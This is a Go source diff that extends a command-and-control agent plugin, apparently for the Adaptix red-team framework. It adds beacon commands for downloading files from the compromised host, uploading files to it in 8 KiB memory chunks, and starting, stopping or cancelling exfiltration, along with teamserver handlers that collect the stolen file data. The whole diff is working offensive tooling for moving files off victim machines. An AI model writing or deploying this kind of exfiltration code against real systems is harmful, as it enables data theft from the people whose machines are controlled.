@@ -14,6 +14,8 @@ package main
 import (
 	"bytes"
 	"crypto/rand"
+	"encoding/base64"
+	mrand "math/rand"
 	"sort"
 	"crypto/rc4"
 	"encoding/binary"
@@ -62,7 +64,12 @@ type Teamserver interface {
 	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
 	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
 	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
+	TsClientGuiFilesStatus(taskData adaptix.TaskData)
 	TsConvertUTF8toCp(data string, cp int) string
+	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
+	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
+	TsDownloadUpdate(fileId string, state int, data []byte) error
+	TsDownloadClose(fileId string, reason int) error
 }
 
 var Ts Teamserver
@@ -77,6 +84,37 @@ func RC4Crypt(data []byte, key []byte) ([]byte, error) {
 	out := make([]byte, len(data))
 	cipher.XORKeyStream(out, data)
 	return out, nil
+}
+
+// createTaskCommandSaveMemory: queue the upload content as SAVEMEMORY
+// chunk tasks (they precede the UPLOAD command — the beacon assembles
+// the chunks, then writes the file). Port of the native pl_utils.go,
+// with our 8 KiB chunk size (the beacon's response-buffer contract).
+func createTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) int {
+	memoryId := int(mrand.Uint32())
+
+	bufferSize := len(buffer)
+
+	taskData := adaptix.TaskData{
+		Type:    adaptix.TASK_TYPE_TASK,
+		AgentId: agentId,
+		Sync:    false,
+	}
+
+	for start := 0; start < bufferSize; start += uploadChunkSize {
+		fin := start + uploadChunkSize
+		if fin > bufferSize {
+			fin = bufferSize
+		}
+
+		array := []interface{}{COMMAND_SAVEMEMORY, memoryId, bufferSize, fin - start, buffer[start:fin]}
+		taskData.Data, _ = PackArray(array)
+		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())
+
+		ts.TsTaskCreate(agentId, "", "", taskData)
+	}
+
+	return memoryId
 }
 
 // sizeBytesToFormat: native pl_utils.go rendering (KiB/MiB/GiB).
@@ -122,8 +160,21 @@ const (
 	COMMAND_DISKS      = 15
 	COMMAND_PS_LIST    = 41
 	COMMAND_PS_KILL    = 42
+	COMMAND_DOWNLOAD   = 32
+	COMMAND_UPLOAD     = 33
+	COMMAND_EXFIL      = 35
+	COMMAND_SAVEMEMORY = 0x2321
 	COMMAND_ERROR     = 0x1111ffff
+
+	DOWNLOAD_START   = 0x1
+	DOWNLOAD_CONTINUE = 0x2
+	DOWNLOAD_FINISH  = 0x3
 )
+
+// Upload chunk size: the beacon's response buffer is 64 KiB — 8 KiB
+// chunks leave room for several chunks plus the rest of the task pack
+// (our contract; the native uses 1 MiB, the wire format is identical).
+const uploadChunkSize = 0x2000
 
 // int32ToIPv4: host-order u32 to dotted quad (native pl_utils.go).
 func int32ToIPv4(value uint) string {
@@ -655,6 +706,60 @@ func (e *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[stri
 
 		array = []interface{}{COMMAND_PROFILE, 1, sleepTime, jitterTime}
 
+	case "download":
+		var path string
+		path, err = getStringArg(args, "file")
+		if err != nil {
+			goto RET
+		}
+		array = []interface{}{COMMAND_DOWNLOAD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}
+
+	case "upload":
+		var fileName string
+		var localFile string
+		var fileContent []byte
+
+		fileName, err = getStringArg(args, "remote_path")
+		if err != nil {
+			goto RET
+		}
+		localFile, err = getStringArg(args, "local_file")
+		if err != nil {
+			goto RET
+		}
+		fileContent, err = base64.StdEncoding.DecodeString(localFile)
+		if err != nil {
+			goto RET
+		}
+
+		memoryId := createTaskCommandSaveMemory(Ts, agentData.Id, fileContent)
+
+		array = []interface{}{COMMAND_UPLOAD, memoryId, Ts.TsConvertUTF8toCp(fileName, agentData.ACP)}
+
+	case "exfil":
+		var fid string
+		var fileId int64
+
+		fid, err = getStringArg(args, "file_id")
+		if err != nil {
+			goto RET
+		}
+		fileId, err = strconv.ParseInt(fid, 16, 64)
+		if err != nil {
+			goto RET
+		}
+
+		if subcommand == "cancel" {
+			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_CANCELED, int(fileId)}
+		} else if subcommand == "stop" {
+			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_STOPPED, int(fileId)}
+		} else if subcommand == "start" {
+			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_RUNNING, int(fileId)}
+		} else {
+			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
+			goto RET
+		}
+
 	case "getuid":
 		array = []interface{}{COMMAND_GETUID}
 
@@ -1145,6 +1250,60 @@ func (e *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData [
 			}
 			pid := packer.ParseInt32()
 			task.Message = fmt.Sprintf("Process %d killed", pid)
+
+		case COMMAND_DOWNLOAD:
+			if false == packer.CheckPacker([]string{"int", "byte"}) {
+				goto HANDLER
+			}
+			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
+			downloadCommand := packer.ParseInt8()
+			if downloadCommand == DOWNLOAD_START {
+				if false == packer.CheckPacker([]string{"long", "array"}) {
+					goto HANDLER
+				}
+				fileSize := packer.ParseInt64()
+				fileName := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
+				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileId)
+				task.Completed = false
+				_ = Ts.TsDownloadAdd(agentData.Id, fileId, fileName, int64(fileSize))
+
+			} else if downloadCommand == DOWNLOAD_CONTINUE {
+				if false == packer.CheckPacker([]string{"array"}) {
+					goto HANDLER
+				}
+				fileContent := packer.ParseBytes()
+				task.Completed = false
+				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_RUNNING, fileContent)
+				continue
+
+			} else if downloadCommand == DOWNLOAD_FINISH {
+				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
+				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_FINISHED)
+			}
+
+		case COMMAND_EXFIL:
+			if false == packer.CheckPacker([]string{"int", "byte"}) {
+				goto HANDLER
+			}
+			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
+			downloadState := packer.ParseInt8()
+
+			if downloadState == adaptix.DOWNLOAD_STATE_STOPPED {
+				task.Message = fmt.Sprintf("Download '%v' successful stopped", fileId)
+				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_STOPPED, []byte(""))
+
+			} else if downloadState == adaptix.DOWNLOAD_STATE_RUNNING {
+				task.Message = fmt.Sprintf("Download '%v' successful resumed", fileId)
+				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_RUNNING, []byte(""))
+
+			} else if downloadState == adaptix.DOWNLOAD_STATE_CANCELED {
+				task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
+				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_CANCELED)
+			}
+
+		case COMMAND_UPLOAD:
+			task.Message = "File successfully uploaded"
+			Ts.TsClientGuiFilesStatus(task)
 
 		case COMMAND_MKDIR:
 			if false == packer.CheckPacker([]string{"array"}) {
